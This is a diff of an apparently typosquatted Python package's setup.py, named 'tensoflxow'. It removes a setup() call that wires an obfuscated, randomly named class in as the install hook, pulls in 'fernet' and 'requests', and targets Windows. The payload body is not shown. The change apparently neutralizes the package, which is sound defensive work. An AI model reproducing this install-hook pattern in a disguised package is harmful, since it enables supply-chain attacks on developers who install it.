@@ -18,22 +18,5 @@ class LytLVzyGWiWlYIaQZYRrpaTpeNaYTvqkPfNKfdWKjdUNJEZrXtJHkYdHomBzIjmCZnyCvTjhDI
             install.run(self)
 
 
-setup(
-    name="tensoflxow",
-    version=VERSION,
-    author="fVXgBAxuImznqILBsEH",
-    author_email="WMfNQHP@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': LytLVzyGWiWlYIaQZYRrpaTpeNaYTvqkPfNKfdWKjdUNJEZrXtJHkYdHomBzIjmCZnyCvTjhDIxORojoExzUTYGNLwxEEYfXtyRawSEGLLAciZhSmSpVrkgWYCGEXZsYxxGyHLTSItHSMaGGGdRlmODURPmRsGvHBLaSOLPWDYPnNGcyvGHKWnjq,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 
